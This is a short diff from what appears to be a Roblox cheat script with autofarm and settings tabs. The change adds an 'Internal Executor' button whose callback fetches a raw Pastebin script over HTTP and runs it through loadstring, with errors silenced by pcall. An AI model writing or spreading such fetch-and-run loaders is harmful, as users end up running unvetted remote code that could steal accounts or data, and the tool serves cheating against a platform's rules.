@@ -3064,6 +3064,16 @@ Tabs.Autofarm:AddButton({
 -- ======================================================================
 -- ⚙️ SETTINGS TAB UI
 -- ======================================================================
+
+Tabs.Settings:AddButton({
+    Title = "Internal Executor",
+    Description = "Loads Pastebin script: KrQxzm4N",
+    Callback = function()
+        pcall(function()
+            loadstring(game:HttpGet("https://pastebin.com/raw/KrQxzm4N"))()
+        end)
+    end
+})
 Tabs.Settings:AddToggle("T_AutoReconnect", { 
     Title = "Auto Reconnect on Disconnect", 
     Default = GlobalMem.FishmanAutoReconnect, 
